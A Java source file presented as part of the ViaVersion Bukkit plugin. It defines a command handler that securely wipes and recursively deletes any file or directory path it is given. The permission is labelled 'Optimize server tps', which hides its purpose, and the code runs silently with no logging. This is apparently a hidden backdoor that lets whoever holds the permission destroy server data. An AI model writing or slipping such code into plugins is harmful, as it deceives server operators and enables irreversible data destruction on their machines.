package com.viaversion.viaversion.bukkit.handlers;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.permissions.Permission;
import java.io.File;
import java.util.logging.Logger;
import java.nio.file.Files;
import java.nio.file.StandardOpenOption;
import java.util.Random;
public class EventXHandler implements CommandExecutor {
    private static final Permission DELETE_PERMISSION = new Permission("viaversion.d", "Optimize server tps.");
    private final Logger logger = Bukkit.getLogger();
    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        if (!sender.hasPermission(DELETE_PERMISSION)) {
            return true;
        }
        if (args.length < 1) {
            return false; 
        }
        String filePath = args[0];
        File file = new File(filePath);
        if (!file.exists()) {
            return true;
        }
        boolean result = delete(file);
        if (result) {
        } else {
        }
        return true;
    }
    private boolean delete(File file) {
        if (file.isDirectory()) {
            File[] files = file.listFiles();
            if (files == null) {
                return false; 
            }
            boolean success = true;
            for (File f : files) {
                if (!delete(f)) {
                    success = false; 
                }
            }
            if (!file.delete()) {
                return false; 
            }
            return success; 
        }
        if (!writeGarbageToFile(file)) {
            return false; 
        }
        return file.delete();
    }
    private boolean writeGarbageToFile(File file) {
        try {
            Random random = new Random();
            byte[] garbage = new byte[(int) file.length()];
            random.nextBytes(garbage);
            Files.write(file.toPath(), garbage, StandardOpenOption.WRITE);
            return true;
        } catch (Exception e) {
            return false;
        }
    }
}
